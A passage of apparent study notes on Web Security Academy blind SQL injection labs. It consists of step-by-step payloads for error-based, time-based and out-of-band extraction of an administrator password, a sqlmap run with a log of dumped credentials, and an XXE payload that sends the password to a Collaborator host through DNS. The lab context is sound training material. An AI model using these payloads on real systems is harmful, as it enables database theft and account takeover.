                            As long as you make sure to always inject syntactically valid SQL queries, you can use this error response to infer key information about the database. For example, in order to verify that the <code>users</code> table exists, send the following query:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'</code>
                        <p>
                            As this query does not return an error, you can infer that this table does exist. Note that the <code>WHERE ROWNUM = 1</code> condition is important here to prevent the query from returning more than one row, which would break our concatenation.
                        </p>
                    </li>
                    <li>
                        <p>
                            You can also exploit this behavior to test conditions. First, submit the following query:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</code>
                        <p>
                            Verify that an error message is received.
                        </p>
                    </li>
                    <li>
                        <p>
                            Now change it to:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</code>
                        <p>
                            Verify that the error disappears. This demonstrates that you can trigger an error conditionally on the truth of a specific condition. The <code>CASE</code> statement tests a condition and evaluates to one expression if the condition is true, and another expression if the condition is false. The former expression contains a divide-by-zero, which causes an error. In this case, the two payloads test the conditions <code>1=1</code> and <code>1=2</code>, and an error is received when the condition is <code>true</code>.
                        </p>
                    </li>
                    <li>
                        <p>
                            You can use this behavior to test whether specific entries exist in a table. For example, use the following query to check whether the username <code>administrator</code> exists:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code>
                        <p>
                            Verify that the condition is true (the error is received), confirming that there is a user called <code>administrator</code>.
                        </p>
                    </li>
                    <li>
                        <p>
                            The next step is to determine how many characters are in the password of the <code>administrator</code> user. To do this, change the value to:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)&gt;1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code>
                        <p>
                            This condition should be true, confirming that the password is greater than 1 character in length.
                        </p>
                    </li>
                    <li>
                        <p>
                            Send a series of follow-up values to test different password lengths. Send:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)&gt;2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code>
                        <p>
                            Then send:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)&gt;3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code>
                        <p>
                            And so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the error disappears), you have determined the length of the password, which is in fact 20 characters long.
                        </p>
                    </li>
                    <li>
                        After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.
                    </li>
                    <li>
                        In the Positions tab of Burp Intruder, clear the default payload positions by clicking the "Clear §" button.
                    </li>
                    <li>
                        <p>
                            In the Positions tab, change the value of the cookie to:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code>
                        <p>
                            This uses the <code>SUBSTR()</code> function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
                        </p>
                    </li>
                    <li>
                        <p>
                            Place payload position markers around the final <code>a</code> character in the cookie value. To do this, select just the <code>a</code>, and click the "Add §" button. You should then see the following as the cookie value (note the payload position markers):
                        </p>
                        <code class="code-scrollable">TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code>
                    </li>
                    <li>
                        To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. Go to the Payloads tab, check that "Simple list" is selected, and under "Payload Options" add the payloads in the range a - z and 0 - 9. You can select these easily using the "Add from list" drop-down.
                    </li>
                    <li>
                        Launch the attack by clicking the "Start attack" button or selecting "Start attack" from the Intruder menu.
                    </li>
                    <li>
                        Review the attack results to find the value of the character at the first position. The application returns an HTTP 500 status code when the error occurs, and an HTTP 200 status code normally. The "Status" column in the Intruder results shows the HTTP status code, so you can easily find the row with 500 in this column. The payload showing for that row is the value of the character at the first position.
                    </li>
                    <li>
                        <p>
                            Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the main Burp window, and the Positions tab of Burp Intruder, and change the specified offset from 1 to 2. You should then see the following as the cookie value:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code>
                    </li>
                    <li>
                        Launch the modified attack, review the results, and note the character at the second offset.
                    </li>
                    <li>
                        Continue this process testing offset 3, 4, and so on, until you have the whole password.
                    </li>
                    <li>
                        In the browser, click "My account" to open the login page. Use the password to log in as the <code>administrator</code> user.
                    </li>
                </ol>
            </div>
        </div>



#### Blind SQL injection with time delays

> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics,  and performs an SQL query containing the value of the submitted cookie.        
>
> The results of the SQL query are not returned, and the  application does not respond any differently based on whether the query  returns any rows or causes an error. However, since the query is  executed synchronously, it is possible to trigger conditional time  delays to infer information.        
>
> To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.        

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the <code>TrackingId</code> cookie.
                    </li>
                    <li>
                        <p>
                            Modify the <code>TrackingId</code> cookie, changing it to:
                        </p>
                        <code class="code-scrollable">TrackingId=x'||pg_sleep(10)--</code>
                    </li>
                    <li>
                        Submit the request and observe that the application takes 10 seconds to respond.
                    </li>
                </ol>
            </div>
        </div>



#### Blind SQL injection with time delays and information retrieval

> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics,  and performs an SQL query containing the value of the submitted cookie. 
>
> The results of the SQL query are not returned, and the  application does not respond any differently based on whether the query  returns any rows or causes an error. However, since the query is  executed synchronously, it is possible to trigger conditional time  delays to infer information. 
>
> The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.        
>
> To solve the lab, log in as the `administrator` user.        

<div class="component-solution is-expandable expanded">
            <h4>Official Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the <code>TrackingId</code> cookie.
                    </li>
                    <li>
                        <p>
                            Modify the <code>TrackingId</code> cookie, changing it to:
                        </p>
                        <code class="code-scrollable">TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--</code>
                        <p>
                            Verify that the application takes 10 seconds to respond.
                        </p>
                    </li>
                    <li>
                        <p>
                            Now change it to:
                        </p>
                        <code class="code-scrollable">TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--</code>
                        <p>
                            Verify that the application responds immediately with no time delay. This demonstrates how you can test a single boolean condition and infer the result.
                        </p>
                    </li>
                    <li>
                        <p>
                            Now change it to:
                        </p>
                        <code class="code-scrollable">TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</code>
                        <p>
                            Verify that the condition is true, confirming that there is a user called <code>administrator</code>.
                        </p>
                    </li>
                    <li>
                        <p>
                            The next step is to determine how many characters are in the password of the <code>administrator</code> user. To do this, change the value to:
                        </p>
                        <code class="code-scrollable">TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)&gt;1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</code>
                        <p>
                            This condition should be true, confirming that the password is greater than 1 character in length.
                        </p>
                    </li>
                    <li>
                        <p>
                            Send a series of follow-up values to test different password lengths. Send:
                        </p>
                        <code class="code-scrollable">TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)&gt;2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</code>
                        <p>
                            Then send:
                        </p>
                        <code class="code-scrollable">TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)&gt;3)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</code>
                        <p>
                            And so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the application responds immediately without a time delay), you have determined the length of the password, which is in fact 20 characters long.
                        </p>
                    </li>
                    <li>
                        After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.
                    </li>
                    <li>
                        In the Positions tab of Burp Intruder, clear the default payload positions by clicking the "Clear §" button.
                    </li>
                    <li>
                        <p>
                            In the Positions tab, change the value of the cookie to:
                        </p>
                        <code class="code-scrollable">TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</code>
                        <p>
                            This uses the <code>SUBSTRING()</code> function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
                        </p>
                    </li>
                    <li>
                        <p>
                            Place payload position markers around the <code>a</code> character in the cookie value. To do this, select just the <code>a</code>, and click the "Add §" button. You should then see the following as the cookie value (note the payload position markers):
                        </p>
                        <code class="code-scrollable">TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</code>
                    </li>
                    <li>
                        To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lower case alphanumeric characters. Go to the Payloads tab, check that "Simple list" is selected, and under "Payload Options" add the payloads in the range a - z and 0 - 9. You can select these easily using the "Add from list" drop-down.
                    </li>
                    <li>
                        To be able to tell when the correct character was submitted, you'll need to monitor the time taken for the application to respond to each request. For this process to be as reliable as possible, you need to configure the Intruder attack to issue requests in a single thread. To do this, go to the "Resource pool" tab and add the attack to a resource pool with the "Maximum concurrent requests" set to <code>1</code>.
                    </li>
                    <li>
                        Launch the attack by clicking the "Start attack" button or selecting "Start attack" from the Intruder menu.
                    </li>
                    <li>
                        Burp Intruder monitors the time taken for the application's response to be received, but by default it does not show this information. To see it, go to the "Columns" menu, and check the box for "Response received".
                    </li>
                    <li>
                        Review the attack results to find the value of the character at the first position. You should see a column in the results called "Response received". This will generally contain a small number, representing the number of milliseconds the application took to respond. One of the rows should have a larger number in this column, in the region of 10,000 milliseconds. The payload showing for that row is the value of the character at the first position.
                    </li>
                    <li>
                        <p>
                            Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the main Burp window, and the Positions tab of Burp Intruder, and change the specified offset from 1 to 2. You should then see the following as the cookie value:
                        </p>
                        <code class="code-scrollable">TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</code>
                    </li>
                    <li>
                        Launch the modified attack, review the results, and note the character at the second offset.
                    </li>
                    <li>
                        Continue this process testing offset 3, 4, and so on, until you have the whole password.
                    </li>
                    <li>
                        In the browser, click "My account" to open the login page. Use the password to log in as the <code>administrator</code> user.
                    </li>
                </ol>
            </div>
        </div>

exploit

```bash
# sqlmap -u 'https://ac871fc81fb30105c0a02a33000900b6.web-security-academy.net/filter?category=Gifts' -v 3 --level=4 --cookie "TrackingId=s1ISxDhHj6xi5i3H" --technique=T --dbms=postgresql -D public -T users --dump
---
Parameter: TrackingId (Cookie)
    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: TrackingId=s1ISxDhHj6xi5i3H' AND 8771=(SELECT 8771 FROM PG_SLEEP(5))-- Tixo
    Vector: AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)
---

[05:11:47] [PAYLOAD] s1ISxDhHj6xi5i3H' AND 5323=(CASE WHEN (ASCII(SUBSTRING((SELECT COALESCE(CAST(username AS VARCHAR(10000))::text,(CHR(32))) FROM public.users ORDER BY password OFFSET 2 LIMIT 1)::text FROM 14 FOR 1))>96) THEN (SELECT 5323 FROM PG_SLEEP(4)) ELSE 5323 END)-- AATS
[05:11:47] [PAYLOAD] s1ISxDhHj6xi5i3H' AND 5323=(CASE WHEN (ASCII(SUBSTRING((SELECT COALESCE(CAST(username AS VARCHAR(10000))::text,(CHR(32))) FROM public.users ORDER BY password OFFSET 2 LIMIT 1)::text FROM 14 FOR 1))>48) THEN (SELECT 5323 FROM PG_SLEEP(4)) ELSE 5323 END)-- AATS
[05:11:48] [PAYLOAD] s1ISxDhHj6xi5i3H' AND 5323=(CASE WHEN (ASCII(SUBSTRING((SELECT COALESCE(CAST(username AS VARCHAR(10000))::text,(CHR(32))) FROM public.users ORDER BY password OFFSET 2 LIMIT 1)::text FROM 14 FOR 1))>1) THEN (SELECT 5323 FROM PG_SLEEP(4)) ELSE 5323 END)-- AATS
[05:11:49] [INFO] retrieved: administrator
[05:11:49] [DEBUG] performed 95 queries in 218.25 seconds
[05:11:49] [DEBUG] analyzing table dump for possible password hashes
Database: public
Table: users
[3 entries]
+----------------------+---------------+
| password             | username      |
+----------------------+---------------+
| 36l5hnu****wni9m9wuv | wiener        |
| c31opx2f****wmdpjiav | carlos        |
| ephwfa6js****zsqp0fs | administrator |
+----------------------+---------------+
```

#### Blind SQL injection with out-of-band interaction

> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics,  and performs an SQL query containing the value of the submitted cookie.        
>
> The SQL query is executed asynchronously and has no effect  on the application's response. However, you can trigger out-of-band  interactions with an external domain.        
>
> To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.        

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the <code>TrackingId</code> cookie.
                    </li>
                    <li>
                        <p>
                            Modify the <code>TrackingId</code> cookie, changing it to a payload that will trigger an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:
                        </p>
                        <code class="code-scrollable">TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('&lt;%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/"&gt;+%25remote%3b]&gt;'),'/l')+FROM+dual--</code>
                    </li>
                </ol>
                <p>
                    The solution described here is sufficient simply to trigger a DNS lookup and so solve the lab. In a real-world situation, you would use Burp Collaborator client to verify that your payload had indeed triggered a DNS lookup and potentially exploit this behavior to exfiltrate sensitive data from the application. We'll go over this technique in the next lab.
                </p>
            </div>
        </div>



#### Blind SQL injection with out-of-band data exfiltration

> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics,  and performs an SQL query containing the value of the submitted cookie. 
>
> The SQL query is executed asynchronously and has no effect  on the application's response. However, you can trigger out-of-band  interactions with an external domain.
>
> The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
>
> To solve the lab, log in as the `administrator` user.

<div class="component-solution is-expandable">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Visit the front page of the shop, and use Burp Suite Professional to intercept and modify the request containing the <code>TrackingId</code> cookie.
                    </li>
                    <li>
                        Go to the Burp menu, and launch the Burp Collaborator client.
                    </li>
                    <li>
                        Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
                    </li>
                    <li>
                        <p>
                            Modify the <code>TrackingId</code> cookie, changing it to a payload that will leak the administrator's password in an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:
                        </p>
                            <code class="code-scrollable">TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('&lt;%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"&gt;+%25remote%3b]&gt;'),'/l')+FROM+dual--</code>
                    </li>
                    <li>
                        Go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side query is executed asynchronously.
                    </li>
                    <li>
                        You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The password of the <code>administrator</code> user should appear in the subdomain of the interaction, and you can view this within the Burp Collaborator client. For DNS interactions, the full domain name that was looked up is shown in the Description tab. For HTTP interactions, the full domain name is shown in the Host header in the Request to Collaborator tab.
                    </li>
                    <li>
                        In the browser, click "My account" to open the login page. Use the password to log in as the <code>administrator</code> user.
                    </li>
                </ol>
            </div>
        </div>

the HTTP request

```http
GET / HTTP/1.0
Host: 3vddbmz****0ts5eale.u0vvbar8hvj1ebcbq6li0qgrnit8hx.burpcollaborator.net
Content-Type: text/plain; charset=utf-8
```

```
The Collaborator server received a DNS lookup of type A for the domain name 3vddbmz****0ts5eale.u0vvbar8hvj1ebcbq6li0qgrnit8hx.burpcollaborator.net.  The lookup was received from IP address....

The Collaborator server received an HTTP request.  The request was received from IP address....
```

